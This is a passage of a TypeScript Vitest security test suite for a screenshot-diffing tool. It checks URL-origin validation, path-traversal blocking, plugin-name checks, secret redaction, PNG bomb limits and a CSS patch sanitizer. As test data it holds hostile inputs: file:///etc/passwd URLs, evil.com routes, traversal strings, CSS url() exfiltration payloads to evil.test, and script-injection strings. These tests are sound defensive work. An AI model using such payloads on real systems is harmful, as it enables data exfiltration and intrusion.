import { describe, it, expect, vi, afterEach } from 'vitest';
import { execFileSync } from 'node:child_process';
import { mkdtempSync, mkdirSync, readFileSync, rmSync, symlinkSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join, resolve } from 'node:path';
import { PNG } from 'pngjs';
import { configSchema, detectSecrets } from '../../src/core/config.js';
import {
  isHttpUrl,
  isSafeAiBaseUrl,
  isOriginBoundPath,
  joinStoryUrl,
  pageUrl,
} from '../../src/discovery/story-url.js';
import { discoverRoutes } from '../../src/discovery/crawler.js';
import { detectPreviewUrl } from '../../src/utils/preview-url.js';
import {
  declaredTargetKeys,
  manifestWithoutStaleShots,
  parseSnapshotKey,
  shotsFromManifest,
} from '../../src/storage/prune-baselines.js';
import { baselineStoragePath } from '../../src/storage/git-orphan.js';
import { runReview } from '../../src/cli/review-command.js';
import { createAccessibilityPlugin } from '../../src/plugins/accessibility.js';
import {
  isValidPluginName,
  installPlugin,
  uninstallPlugin,
  loadPlugin,
} from '../../src/core/plugin-registry.js';
import { chromiumLaunchArgs, matchesBlockedUrl } from '../../src/render/chromium-args.js';
import {
  buildImageKey,
  LocalUploader,
  GitHubArtifactUploader,
} from '../../src/storage/image-upload.js';
import {
  DEFAULT_SENSITIVE_SELECTORS,
  applySensitiveRedactionInPage,
  scrubRedactedDomInPage,
  redactSensitiveDomHtml,
} from '../../src/render/redaction.js';
import { redact, redactDeep } from '../../src/utils/redact.js';
import { FORWARDED_ENV_VARS } from '../../src/render/docker.js';
import { assertSafePngBounds, hasPngMagicBytes, readPngSafe } from '../../src/diff/png-safe.js';
import { compareScreenshot } from '../../src/diff/pixel.js';
import { extractDiffClusters } from '../../src/diff/regions.js';
import {
  createPerfBudgetPlugin,
  extractMetricsFromSnapshot,
} from '../../src/plugins/perf-budgets.js';
import { runExitCode } from '../../src/cli/exit-code.js';
import { createMonitorPlugin, resolveMonitorUrls } from '../../src/plugins/monitor.js';
import { parseImports, unresolvedRelativeImports, buildDependencyGraph } from '../../src/graph/parser.js';
import { incompleteAnalysisReason } from '../../src/graph/resolver.js';
import { discoverRoutesFromFilesystem } from '../../src/discovery/filesystem.js';
import { resolveStoryFrontguardParameters } from '../../src/discovery/storybook-parameters.js';
import { generateGitHubActionsWorkflow } from '../../src/templates/github-actions.js';
import { validateCssPatch, assertSafeCssPatch } from '../../src/sandbox/css-sanitize.js';
import { verifyFix } from '../../src/sandbox/verify-fix.js';
import { DaytonaSandbox } from '../../src/sandbox/daytona.js';
import { GitHubPRReporter } from '../../src/report/github-pr.js';
import { sanitizeConsoleText } from '../../src/report/console.js';
import { HTMLReporter } from '../../src/report/html.js';
import { JSONReporter } from '../../src/report/json.js';
import { buildConfig } from '../../src/cli/index.js';
import type { DiffResult, FrontguardConfig, RunResult, ScreenshotResult } from '../../src/core/types.js';

function solidPng(w: number, h: number, r: number, g: number, b: number, a = 255): Buffer {
  const png = new PNG({ width: w, height: h });
  for (let i = 0; i < w * h; i++) {
    const idx = i << 2;
    png.data[idx] = r;
    png.data[idx + 1] = g;
    png.data[idx + 2] = b;
    png.data[idx + 3] = a;
  }
  return PNG.sync.write(png);
}

function makeShot(buffer: Buffer, path = '/'): ScreenshotResult {
  return {
    route: { path },
    viewport: 100,
    browser: 'chromium',
    buffer,
    domSnapshot: '',
    consoleErrors: [],
    timestamp: 0,
    duration: 0,
  };
}

function makeRun(diffs: DiffResult[], extra: Partial<RunResult> = {}): RunResult {
  return {
    summary: {
      total: diffs.length,
      passed: diffs.filter((d) => d.status === 'pass').length,
      regressions: diffs.filter((d) => d.status === 'regression').length,
      warnings: diffs.filter((d) => d.status === 'changed').length,
      newPages: diffs.filter((d) => d.status === 'new').length,
      errors: diffs.filter((d) => d.status === 'error').length,
    },
    diffs,
    timing: { discovery: 10, render: 20, compare: 5, ai: 0, total: 35 },
    config: {
      version: 1,
      baseUrl: 'http://localhost:3000',
      viewports: [1440],
      browsers: ['chromium'],
      threshold: 0.1,
      ignore: [],
      smartRender: true,
      workers: 1,
      pageTimeout: 30_000,
      maxHeight: 5_000,
      outputDir: './report',
    },
    ...extra,
  };
}

describe('#400 & #410: URL scheme, origin bounds, and AI config bounds', () => {
  afterEach(() => {
    vi.unstubAllEnvs();
  });

  it('rejects non-HTTP(S) schemes and origin-escaping routes in configSchema', () => {
    expect(configSchema.safeParse({ baseUrl: 'file:///etc/passwd' }).success).toBe(false);
    expect(configSchema.safeParse({ baseUrl: 'javascript:alert(1)' }).success).toBe(false);
    expect(
      configSchema.safeParse({
        baseUrl: 'http://localhost:3000',
        routes: ['//evil.com/steal'],
      }).success,
    ).toBe(false);
    expect(
      configSchema.safeParse({
        baseUrl: 'http://localhost:3000',
        routes: ['https://evil.com/steal'],
      }).success,
    ).toBe(false);
    expect(
      configSchema.safeParse({
        baseUrl: 'http://localhost:3000',
        routes: ['/\\evil.com'],
      }).success,
    ).toBe(false);
    expect(
      configSchema.safeParse({
        baseUrl: 'http://localhost:3000',
        discover: { startUrl: 'file:///etc/hosts' },
      }).success,
    ).toBe(false);
    expect(
      configSchema.safeParse({
        baseUrl: 'http://localhost:3000',
        routes: ['/dashboard', { path: '/settings?tab=1' }],
      }).success,
    ).toBe(true);
  });

  it('enforces AI config timeoutMs upper bound, maxCalls default, allowFallback, and baseUrl policy', () => {
    const defaults = configSchema.parse({
      baseUrl: 'http://localhost:3000',
      ai: { provider: 'openai' },
    });
    expect(defaults.ai?.maxCalls).toBe(50);

    const zeroCalls = configSchema.parse({
      baseUrl: 'http://localhost:3000',
      ai: { provider: 'openai', maxCalls: 0, allowFallback: true, timeoutMs: 300_000 },
    });
    expect(zeroCalls.ai?.maxCalls).toBe(0);
    expect(zeroCalls.ai?.allowFallback).toBe(true);

    expect(
      configSchema.safeParse({
        baseUrl: 'http://localhost:3000',
        ai: { provider: 'openai', timeoutMs: 300_001 },
      }).success,
    ).toBe(false);
    expect(
      configSchema.safeParse({
        baseUrl: 'http://localhost:3000',
        ai: { provider: 'openai', baseUrl: 'http://remote.example.com/v1' },
      }).success,
    ).toBe(false);
    expect(
      configSchema.safeParse({
        baseUrl: 'http://localhost:3000',
        ai: { provider: 'openai', baseUrl: 'http://127.0.0.1:11434/v1' },
      }).success,
    ).toBe(true);
    expect(isSafeAiBaseUrl('http://localhost:8080')).toBe(true);
    expect(isSafeAiBaseUrl('http://[::1]:8080')).toBe(true);
    expect(isSafeAiBaseUrl('https://api.openai.com/v1')).toBe(true);
    expect(isSafeAiBaseUrl('file:///etc/passwd')).toBe(false);
  });

  it('enforces origin-bound story/page URLs and rejects unsafe preview/crawler/monitor URLs', async () => {
    expect(isHttpUrl('https://example.com')).toBe(true);
    expect(isHttpUrl('javascript:alert(1)')).toBe(false);
    expect(isOriginBoundPath('/ok', 'http://localhost:3000')).toBe(true);
    expect(isOriginBoundPath('//evil.com', 'http://localhost:3000')).toBe(false);
    expect(() => joinStoryUrl('file:///tmp', '/iframe.html')).toThrow(/http/);
    expect(() => pageUrl('http://localhost:3000', '//evil.com/x')).toThrow(/origin-bound/);
    expect(() => pageUrl('http://localhost:3000', 'https://evil.com/x')).toThrow(/origin-bound/);

    vi.stubEnv('VERCEL_URL', 'javascript:alert(1)');
    expect(detectPreviewUrl()).toBeNull();
    vi.stubEnv('VERCEL_URL', '');
    vi.stubEnv('PREVIEW_URL', 'file:///etc/passwd');
    expect(detectPreviewUrl()).toBeNull();

    await expect(
      discoverRoutes({
        ...makeRun([]).config,
        baseUrl: 'file:///etc/passwd',
        discover: { startUrl: '/' },
      }),
    ).rejects.toThrow(/http/);
    await expect(
      discoverRoutes({
        ...makeRun([]).config,
        baseUrl: 'http://localhost:3000',
        discover: { startUrl: 'https://evil.com/admin' },
      }),
    ).rejects.toThrow(/baseUrl origin/);

    expect(() => resolveMonitorUrls(['//evil.com/x'], 'https://example.com')).toThrow(/origin/);
    expect(() => resolveMonitorUrls(['https://evil.com'], 'https://example.com')).toThrow(/origin/);
    const plugin = createMonitorPlugin({ urls: ['file:///etc/passwd'] });
    expect(() =>
      plugin.setup!({ config: {} as FrontguardConfig, logger: console as never, metadata: new Map() }),
    ).toThrow(/Invalid URL/);
    const badHook = createMonitorPlugin({
      urls: ['https://example.com'],
      alerts: { webhook: 'file:///tmp/hook' },
    });
    expect(() =>
      badHook.setup!({ config: {} as FrontguardConfig, logger: console as never, metadata: new Map() }),
    ).toThrow(/Invalid webhook URL/);
  });
});

describe('#405: prune-baselines modes/traversal, review --from pre-refusal safety, accessibility fail-closed', () => {
  it('preserves named-mode baselines in prune-baselines and blocks manifest path traversal', () => {
    expect(parseSnapshotKey('1440/dark/chromium')).toEqual({
      viewport: 1440,
      browser: 'chromium',
      mode: 'dark',
    });
    expect(parseSnapshotKey('1440/../../../approvals')).toBeNull();
    expect(parseSnapshotKey('1440/evil-browser')).toBeNull();
    expect(() => baselineStoragePath('/', 1440, '../evil' as never)).toThrow(/Invalid browser engine/);

    const declared = declaredTargetKeys({
      routes: ['/pricing'],
      viewports: [1440],
      browsers: ['chromium'],
      modes: { light: { colorScheme: 'light' }, dark: { colorScheme: 'dark' } },
    });
    expect(declared.complete).toBe(true);
    expect(declared.keys.has(['/pricing', '1440', 'dark', 'chromium'].join('\0'))).toBe(true);

    const manifest = {
      schemaVersion: 2,
      createdBy: 'test',
      updatedAt: '2026-01-01T00:00:00.000Z',
      routes: {
        '/pricing': {
          viewports: [1440],
          browsers: ['chromium' as const],
          lastUpdated: '2026-01-01T00:00:00.000Z',
          snapshots: {
            '1440/dark/chromium': { sha256: 'abc', updatedAt: '2026-01-01T00:00:00.000Z' },
            '1440/../../../approvals': { sha256: 'bad', updatedAt: '2026-01-01T00:00:00.000Z' },
          },
        },
      },
    };
    const shots = shotsFromManifest(manifest);
    expect(shots).toHaveLength(1);
    expect(shots[0]).toMatchObject({ route: '/pricing', viewport: 1440, mode: 'dark', browser: 'chromium' });

    const trimmed = manifestWithoutStaleShots(manifest, shots);
    expect(trimmed.routes['/pricing']?.snapshots?.['1440/dark/chromium']).toBeUndefined();
  });

  it('refuses non-PNG files and does not create frontguard-baselines before refusal gates in review --from', async () => {
    const repo = mkdtempSync(join(tmpdir(), 'fg-sec-rev-'));
    try {
      execFileSync('git', ['init', '--quiet'], { cwd: repo, stdio: 'pipe' });
      execFileSync('git', ['config', 'user.email', 'a@b.c'], { cwd: repo, stdio: 'pipe' });
      execFileSync('git', ['config', 'user.name', 'Test'], { cwd: repo, stdio: 'pipe' });
      execFileSync('git', ['config', 'commit.gpgsign', 'false'], { cwd: repo, stdio: 'pipe' });
      writeFileSync(join(repo, 'README.md'), 'x\n');
      execFileSync('git', ['add', '-A'], { cwd: repo, stdio: 'pipe' });
      execFileSync('git', ['commit', '--quiet', '-m', 'init'], { cwd: repo, stdio: 'pipe' });

      const reportDir = join(repo, 'report');
      mkdirSync(join(reportDir, 'images'), { recursive: true });
      writeFileSync(join(reportDir, 'images', 'bad.png'), Buffer.from('NOT-A-PNG'));
      writeFileSync(
        join(reportDir, 'review.json'),
        JSON.stringify({
          shots: [
            {
              route: '/home',
              viewport: 800,
              browser: 'chromium',
              mode: 'dark',
              status: 'regression',
              current: 'images/bad.png',
            },
          ],
        }),
      );

      const out = await runReview({
        cwd: repo,
        reportDir,
        from: true,
        all: true,
        confirmBaselines: true,
        config: {
          version: 1,
          baseUrl: 'http://127.0.0.1:9',
          viewports: [800],
          browsers: ['chromium'],
          threshold: 0.1,
          ignore: [],
          smartRender: true,
          workers: 1,
          pageTimeout: 30_000,
          maxHeight: 5_000,
          outputDir: reportDir,
        },
      });

      expect(out.exitCode).toBe(2);
      expect(out.message).toMatch(/not a valid PNG/);
      // Verify frontguard-baselines branch was NEVER created prior to refusal!
      const branches = execFileSync('git', ['branch', '--list', 'frontguard-baselines'], {
        cwd: repo,
        encoding: 'utf8',
      }).trim();
      expect(branches).toBe('');
    } finally {
      rmSync(repo, { recursive: true, force: true });
    }
  });

  it('accessibility plugin fails closed when failOnViolation is true and axe is absent or offline results missing', async () => {
    const plugin = createAccessibilityPlugin({ failOnViolation: true });
    const ctx = {
      config: { baseUrl: 'http://127.0.0.1:9' } as FrontguardConfig,
      logger: console as never,
      metadata: new Map<string, unknown>([['accessibility:require-complete', true]]),
    };
    // When axe is unavailable (setup not run / axe absent), fails closed immediately
    await expect(plugin.afterRender!([makeShot(solidPng(4, 4, 0, 0, 0))], ctx)).rejects.toThrow(
      /Accessibility check failed: @axe-core\/playwright is not installed/,
    );
    // When axe IS available but audit cannot complete, fails closed on incomplete audit
    await plugin.setup!(ctx);
    await expect(plugin.afterRender!([makeShot(solidPng(4, 4, 0, 0, 0))], ctx)).rejects.toThrow(
      /Accessibility check failed: 1 audit\(s\) did not complete/,
    );

    // Offline review mode with missing results fails closed without launching browser
    const offlineCtx = {
      config: { baseUrl: 'http://127.0.0.1:9' } as FrontguardConfig,
      logger: console as never,
      metadata: new Map<string, unknown>([
        ['accessibility:require-complete', true],
        ['accessibility:offline', true],
      ]),
    };
    await expect(
      plugin.afterRender!([makeShot(solidPng(4, 4, 0, 0, 0))], offlineCtx),
    ).rejects.toThrow(/missing from offline review artifact/);
  });
});

describe('#406: plugin registry, Chromium sandbox args, image uploaders, and Dockerfiles', () => {
  it('rejects npm aliases, URLs, git+, file:, and traversal in plugin-registry', async () => {
    for (const bad of [
      'frontguard-plugin-foo@npm:evil',
      'frontguard-plugin-foo@https://evil.test/pkg.tgz',
      'git+https://evil.test/repo.git',
      'file:../frontguard-plugin-evil',
      '../frontguard-plugin-evil',
      '--registry=https://evil.test',
    ]) {
      expect(isValidPluginName(bad)).toBe(false);
    }
    const exec = vi.fn();
    await expect(
      installPlugin('foo@npm:evil', { pm: 'npm', exec: exec as never }),
    ).rejects.toThrow(/valid Frontguard plugin/);
    await expect(
      uninstallPlugin('foo@npm:evil', { pm: 'npm', exec: exec as never }),
    ).rejects.toThrow(/valid Frontguard plugin/);
    const importer = vi.fn();
    await expect(loadPlugin('../evil', undefined, importer)).rejects.toThrow(
      /valid Frontguard plugin/,
    );
    expect(exec).not.toHaveBeenCalled();
    expect(importer).not.toHaveBeenCalled();
  });

  it('omits --no-sandbox by default and enables it only with FRONTGUARD_CHROMIUM_NO_SANDBOX=1', () => {
    expect(chromiumLaunchArgs({})).toEqual(['--disable-gpu']);
    expect(chromiumLaunchArgs({ FRONTGUARD_CHROMIUM_NO_SANDBOX: '0' })).toEqual(['--disable-gpu']);
    expect(chromiumLaunchArgs({ FRONTGUARD_CHROMIUM_NO_SANDBOX: '1' })).toEqual([
      '--disable-gpu',
      '--no-sandbox',
      '--disable-setuid-sandbox',
    ]);

    const cliDockerfile = readFileSync(resolve(import.meta.dirname, '../../Dockerfile'), 'utf8');
    const renderDockerfile = readFileSync(
      resolve(import.meta.dirname, '../../docker/Dockerfile'),
      'utf8',
    );
    expect(cliDockerfile).toContain('USER pwuser');
    expect(cliDockerfile).toContain('FRONTGUARD_CHROMIUM_NO_SANDBOX=1');
    expect(renderDockerfile).toContain('USER pwuser');
    expect(renderDockerfile).toContain('FRONTGUARD_CHROMIUM_NO_SANDBOX=1');
  });

  it('sanitizes buildImageKey and blocks path traversal in LocalUploader and GitHubArtifactUploader', async () => {
    const key = buildImageKey({
      project: '../../etc',
      runId: '../run',
      route: '/../../secret',
      viewport: 1440,
      browser: '../chromium',
      type: 'diff',
    });
    expect(key).not.toContain('..');

    const tmp = mkdtempSync(join(tmpdir(), 'fg-up-sec-'));
    try {
      const local = new LocalUploader(tmp);
      await expect(local.upload('../escape.png', Buffer.from('x'))).rejects.toThrow(/Invalid image upload key/);
      expect(() => local.getUrl('/etc/passwd')).toThrow(/Invalid image upload key/);

      const gha = new GitHubArtifactUploader(tmp);
      await expect(gha.upload('a/../../escape.png', Buffer.from('x'))).rejects.toThrow(/Invalid image upload key/);
      expect(() => gha.getUrl('a\\b.png')).toThrow(/Invalid image upload key/);
    } finally {
      rmSync(tmp, { recursive: true, force: true });
    }
  });
});

describe('#407: redactSensitive, expanded secret redaction, circular detectSecrets, DO_NOT_TRACK', () => {
  it('includes card/cvv/cvc selectors and scrubs non-input redacted HTML elements', () => {
    expect(DEFAULT_SENSITIVE_SELECTORS).toContain('input[name*="card" i]');
    expect(DEFAULT_SENSITIVE_SELECTORS).toContain('input[name*="cvv" i]');
    expect(DEFAULT_SENSITIVE_SELECTORS).toContain('input[name*="cvc" i]');

    const html =
      '<input name="cardNumber" value="4111111111111111" placeholder="4111">' +
      '<textarea data-sensitive>super-secret-note</textarea>' +
      '<div data-frontguard-redact><span>SSN 123-45-6789</span></div>';
    const scrubbed = redactSensitiveDomHtml(html);
    expect(scrubbed).not.toContain('4111111111111111');
    expect(scrubbed).not.toContain('super-secret-note');
    expect(scrubbed).not.toContain('123-45-6789');
  });

  it('evaluates redaction selectors individually and scrubs descendants/iframes', () => {
    const styleSet = vi.fn();
    const childStyleSet = vi.fn();
    const attrs = new Map<string, string>();
    const childAttrs = new Map<string, string>();
    const textNode = { nodeType: 3, nodeValue: 'secret-token' };
    const child = {
      tagName: 'IMG',
      hasAttribute: (k: string) => childAttrs.has(k),
      getAttribute: (k: string) => childAttrs.get(k) ?? null,
      setAttribute: (k: string, v: string) => { childAttrs.set(k, v); },
      removeAttribute: (k: string) => { childAttrs.delete(k); },
      style: { setProperty: childStyleSet },
      childNodes: [textNode],
    };
    const matchedEl = {
      tagName: 'DIV',
      hasAttribute: (k: string) => attrs.has(k),
      getAttribute: (k: string) => attrs.get(k) ?? null,
      setAttribute: (k: string, v: string) => { attrs.set(k, v); },
      removeAttribute: (k: string) => { attrs.delete(k); },
      style: { setProperty: styleSet },
      querySelectorAll: () => [child],
      childNodes: [],
    };
    const fakeDoc = {
      querySelectorAll(sel: string) {
        if (sel === '::bad[[') throw new Error('SyntaxError');
        if (sel === '*') return [matchedEl];
        return [matchedEl];
      },
    };
    vi.stubGlobal('document', fakeDoc);
    try {
      const count = applySensitiveRedactionInPage(['::bad[[', '[data-sensitive]']);
      expect(count).toBe(1);
      expect(styleSet).toHaveBeenCalledWith('-webkit-text-fill-color', 'transparent', 'important');
      expect(childStyleSet).toHaveBeenCalledWith('filter', 'brightness(0)', 'important');

      scrubRedactedDomInPage(['[data-sensitive]']);
      expect(textNode.nodeValue).toBe('[REDACTED]');
    } finally {
      vi.unstubAllGlobals();
    }
  });

  it('redacts Gemini/Figma/Frontguard/URL userinfo secrets and handles circular objects', () => {
    const gemini = `AIza${'A'.repeat(35)}`;
    const figma = `figd_${'a1b2c3d4e5f6g7h8i9j0'}`;
    const fg = `fg_${'1234567890abcdef1234'}`;
    const urlCred = 'https://alice:hunter2@proxy.internal/v1';
    const cleaned = redact(`${gemini} ${figma} ${fg} ${urlCred}`);
    expect(cleaned).not.toContain(gemini);
    expect(cleaned).not.toContain(figma);
    expect(cleaned).not.toContain(fg);
    expect(cleaned).not.toContain('hunter2');
    expect(cleaned).toContain('https://[REDACTED]@proxy.internal/v1');

    const cyclic: Record<string, unknown> = { key: gemini };
    cyclic.self = cyclic;
    const warn = vi.spyOn(console, 'warn').mockImplementation(() => {});
    try {
      expect(() => detectSecrets(cyclic)).not.toThrow();
      expect(warn).toHaveBeenCalled();
      const redactedObj = redactDeep(cyclic);
      expect(redactedObj.key).toBe('[REDACTED]');
    } finally {
      warn.mockRestore();
    }

    expect(FORWARDED_ENV_VARS).toContain('DO_NOT_TRACK');
  });
});

describe('#408: diff invariants, PNG bounds, perf budgets, smartFilter aliases/barrels, edge cases', () => {
  it('blocks PNG IHDR bombs before decoding', () => {
    const bomb = Buffer.alloc(32);
    Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]).copy(bomb, 0);
    bomb.writeUInt32BE(13, 8);
    bomb.write('IHDR', 12, 'ascii');
    bomb.writeUInt32BE(60_000, 16);
    bomb.writeUInt32BE(60_000, 20);
    expect(hasPngMagicBytes(bomb)).toBe(true);
    expect(() => assertSafePngBounds(bomb)).toThrow(/exceed safe limits/);
    expect(() => readPngSafe(bomb)).toThrow(/exceed safe limits/);
  });

  it('catches transparent-black dimension expansion and blocks SSIM override on wmax > 64', () => {
    const base = solidPng(40, 40, 0, 0, 0, 0);
    const taller = solidPng(40, 80, 0, 0, 0, 0);
    const dimRes = compareScreenshot(makeShot(taller), base, 0.1);
    expect(dimRes.dimensionNote).toContain('Dimension mismatch');
    expect(dimRes.error).toBeUndefined();
    expect(dimRes.diffPercentage).toBeGreaterThan(40);
    expect(dimRes.status).toBe('regression');

    // Compact 16x16 high-contrast edit on a large canvas: wmax > 64, global SSIM > 0.98
    const bPng = new PNG({ width: 200, height: 200 });
    const cPng = new PNG({ width: 200, height: 200 });
    bPng.data.fill(255);
    cPng.data.fill(255);
    // Low-density text-like edit inside 16x16 window (100 dark pixels -> wmax = 100 > 64, density < 0.5)
    for (let y = 20; y < 36; y++) {
      for (let x = 20; x < 36; x++) {
        if ((x + y) % 2 === 0 && y < 34) {
          const idx = (y * 200 + x) << 2;
          cPng.data[idx] = 0;
          cPng.data[idx + 1] = 0;
          cPng.data[idx + 2] = 0;
        }
      }
    }
    const ssimRes = compareScreenshot(makeShot(PNG.sync.write(cPng)), PNG.sync.write(bPng), 0.1, {
      enabled: true,
      ssimThreshold: 0.98,
    });
    expect(ssimRes.windowMax).toBeGreaterThan(64);
    expect(ssimRes.status).toBe('regression');
    expect(ssimRes.ssimOverride).toBeUndefined();
  });

  it('extractDiffClusters merges clusters efficiently and blockUrls avoids ReDoS', () => {
    const w = 400;
    const h = 400;
    const mask = new Uint8Array(w * h);
    for (let y = 10; y < 30; y++) {
      for (let x = 10; x < 30; x++) mask[y * w + x] = 1;
      for (let x = 35; x < 55; x++) mask[y * w + x] = 1;
    }
    const clusters = extractDiffClusters(mask, w, h, { dilateRadiusX: 2, dilateRadiusY: 2, mergeMargin: 10 });
    expect(clusters).toHaveLength(1);

    const start = performance.now();
    expect(matchesBlockedUrl('https://example.com/' + 'a'.repeat(5000), ['*' + 'a*'.repeat(40) + 'z'])).toBe(false);
    expect(performance.now() - start).toBeLessThan(100);
  });

  it('wires perf-budgets failOnBudgetExceeded through RunResult/runExitCode and resists DOM spoofing', () => {
    const spoofed =
      '<script id="__frontguard_perf_data">{"resources":1,"pageWeight":1,"ttfb":1,"domContentLoaded":1}</script>' +
      '<script id="__frontguard_perf_data">{"resources":99,"pageWeight":999999,"ttfb":800,"domContentLoaded":1500}</script>';
    expect(extractMetricsFromSnapshot(spoofed)?.resources).toBe(99);

    const plugin = createPerfBudgetPlugin({
      budgets: { maxRequests: 10 },
      failOnBudgetExceeded: true,
    });
    const ctx = { config: {} as FrontguardConfig, logger: console as never, metadata: new Map() };
    const shot: ScreenshotResult = {
      ...makeShot(Buffer.alloc(0), '/home'),
      domSnapshot: '<script id="__frontguard_perf_data">{"resources":1,"pageWeight":1,"ttfb":1,"domContentLoaded":1}</script>',
      perfMetrics: { resources: 42, pageWeight: 50_000, ttfb: 50, domContentLoaded: 200 },
    };
    const diff: DiffResult = {
      route: { path: '/home' },
      viewport: 100,
      browser: 'chromium',
      status: 'pass',
      diffPercentage: 0,
    };
    const runResult = makeRun([diff]);
    plugin.afterRender!([shot], ctx);
    plugin.afterCompare!([diff], ctx);
    plugin.afterRun!(runResult, ctx);
    expect(runResult.perfBudgetFailed).toBe(true);
    expect(runExitCode(runResult.summary, undefined, runResult.summary.regressions, runResult.perfBudgetFailed)).toBe(1);
    process.exitCode = 0;
  });

  it('parses barrel re-exports and @/ path aliases, fails safe on unresolved aliases, and handles symlink cycles', () => {
    const dir = mkdtempSync(join(tmpdir(), 'fg-graph-sec-'));
    try {
      mkdirSync(join(dir, 'src/components'), { recursive: true });
      writeFileSync(
        join(dir, 'tsconfig.json'),
        JSON.stringify({ compilerOptions: { baseUrl: '.', paths: { '@/*': ['src/*'] } } }),
      );
      writeFileSync(join(dir, 'src/components/Button.tsx'), 'export const Button = () => null;');
      writeFileSync(join(dir, 'src/components/index.ts'), "export * from './Button';\n");
      writeFileSync(
        join(dir, 'src/page.tsx'),
        "import { Button } from '@/components';\nexport const Page = () => Button();\n",
      );
      writeFileSync(
        join(dir, 'src/broken.tsx'),
        "import { Missing } from '@/does-not-exist';\n",
      );

      const pagePath = join(dir, 'src/page.tsx');
      expect(parseImports(join(dir, 'src/components/index.ts'), dir)).toContain(
        join(dir, 'src/components/Button.tsx'),
      );
      const graph = buildDependencyGraph([pagePath], dir);
      expect(graph.get(pagePath)?.has(join(dir, 'src/components/index.ts'))).toBe(true);
      expect(graph.get(join(dir, 'src/components/index.ts'))?.has(join(dir, 'src/components/Button.tsx'))).toBe(true);

      const missing = unresolvedRelativeImports(join(dir, 'src/broken.tsx'), dir);
      expect(missing).toContain('@/does-not-exist');
      const reason = incompleteAnalysisReason({
        changedFiles: [join(dir, 'src/broken.tsx')],
        removedFiles: [],
        graph: new Map(),
        entryFiles: [],
        projectDir: dir,
      });
      expect(reason).toContain('unresolved import @/does-not-exist');

      // Symlink cycle in filesystem discovery
      const appDir = join(dir, 'app');
      mkdirSync(join(appDir, 'about'), { recursive: true });
      writeFileSync(join(dir, 'next.config.js'), 'module.exports = {};');
      writeFileSync(join(appDir, 'page.tsx'), 'export default () => null;');
      writeFileSync(join(appDir, 'about/page.tsx'), 'export default () => null;');
      symlinkSync(appDir, join(appDir, 'about/loop'));
      const routes = discoverRoutesFromFilesystem(dir);
      expect(routes?.map((r) => r.path).sort()).toEqual(['/', '/about']);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  it('blocks Storybook importPath traversal, validates v7 params, avoids npx wait-on, and validates buildConfig overrides', async () => {
    const dir = mkdtempSync(join(tmpdir(), 'fg-sb-sec-'));
    try {
      const outside = join(dir, 'secret.stories.ts');
      const project = join(dir, 'proj');
      mkdirSync(project, { recursive: true });
      writeFileSync(
        outside,
        'export default { title: "Leak", parameters: { frontguard: { label: "leaked" } } }; export const Primary = {};',
      );
      const resolved = await resolveStoryFrontguardParameters(
        'http://localhost:6006',
        [
          { id: 'leak--primary', importPath: '../secret.stories.ts' },
          { id: 'v7--bad', parameters: { frontguard: { threshold: 999, label: 'ok' } as never } },
        ],
        { storybookMajor: 7, projectRoot: project },
      );
      expect(resolved.has('leak--primary')).toBe(false);
      expect(resolved.get('v7--bad')).toEqual({ label: 'ok' });
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }

    const wf = generateGitHubActionsWorkflow({ port: 3000 });
    expect(wf).not.toContain('npx wait-on');
    expect(wf).toContain('fetch(u)');

    const cfg = await buildConfig({ url: 'http://localhost:3000' });
    expect(cfg.explicitBaseUrl).toBe(true);
    await expect(
      buildConfig({ url: 'http://localhost:3000', browsers: 'chromium,<script>alert(1)</script>' }),
    ).rejects.toThrow(/Invalid Frontguard config/);
  });
});

describe('#409: CSS sanitizer, PR comment authorship & escaping, console ANSI stripping, HTML/JSON safety', () => {
  it('blocks malicious and hiding CSS patches while accepting safe layout fixes', () => {
    expect(validateCssPatch('.card { overflow: hidden; padding: 8px; }').safe).toBe(true);
    for (const bad of [
      '@import "https://evil.test/x.css";',
      '.a { background: url(https://evil.test/leak); }',
      '.a { background: \\75 rl(https://evil.test/leak); }',
      '.a { background: /*x*/url(https://evil.test/leak); }',
      '.a { background: image-set("https://evil.test/a.png" 1x); }',
      '</style><script>alert(1)</script>',
      '.a { display: none !important; }',
      '.a { visibility: hidden; }',
      '.a { opacity: 0; }',
      '.a { font-size: 0px; }',
      '.a { transform: scale(0); }',
      '.a { color: red; ',
    ]) {
      expect(validateCssPatch(bad).safe, `expected unsafe: ${bad}`).toBe(false);
      expect(() => assertSafeCssPatch(bad)).toThrow(/Unsafe CSS patch rejected/);
    }
  });

  it('blocks unsafe CSS and cross-origin routes in verifyFix and DaytonaSandbox', async () => {
    const sb = new DaytonaSandbox();
    await expect(
      sb.applyPatch({ type: 'css', content: '@import url(https://evil.test/a.css);' }),
    ).rejects.toThrow(/Unsafe CSS patch/);

    const diff: DiffResult = {
      route: { path: '//evil.test/pwn' },
      viewport: 800,
      browser: 'chromium',
      status: 'regression',
      diffPercentage: 10,
      baselineImage: solidPng(4, 4, 0, 0, 0),
    };
    const res = await verifyFix(
      diff,
      { fixType: 'css', category: 'overflow-fix', patch: '.a { padding: 4px; }', confidence: 0.9, explanation: 'x' },
      makeRun([]).config,
      { baseUrl: 'http://localhost:3000' },
    );
    expect(res.verified).toBe(false);
    expect(res.error).toMatch(/origin-bound/);
  });

  it('verifies PR comment authorship, caps pagination, escapes untrusted output, and strips terminal ANSI', async () => {
    vi.stubEnv('GITHUB_TOKEN', 'tok');
    const fetchMock = vi
      .fn()
      // Page 1 has an attacker comment with the marker
      .mockResolvedValueOnce(
        new Response(
          JSON.stringify([
            {
              id: 55,
              body: '<!-- frontguard-report --> hijacked',
              user: { login: 'random-attacker', type: 'User' },
            },
          ]),
          { status: 200 },
        ),
      )
      // Lazy GET /user returns our own login
      .mockResolvedValueOnce(new Response(JSON.stringify({ login: 'ci-runner' }), { status: 200 }))
      // Creates a brand-new comment instead of editing attacker's comment #55
      .mockResolvedValueOnce(new Response('', { status: 201 }));
    vi.stubGlobal('fetch', fetchMock);
    try {
      const pr = new GitHubPRReporter({ owner: 'o', repo: 'r', prNumber: 9 });
      await pr.postComment('<!-- frontguard-report -->\nbody');
      expect(fetchMock.mock.calls[2]?.[0]).toBe('https://api.github.com/repos/o/r/issues/9/comments');
      expect(fetchMock.mock.calls[2]?.[1]).toMatchObject({ method: 'POST' });
    } finally {
      vi.unstubAllGlobals();
      vi.unstubAllEnvs();
    }

    const secret = `AIza${'B'.repeat(35)}`;
    const diff: DiffResult = {
      route: { path: '/x<script>' },
      viewport: 1440,
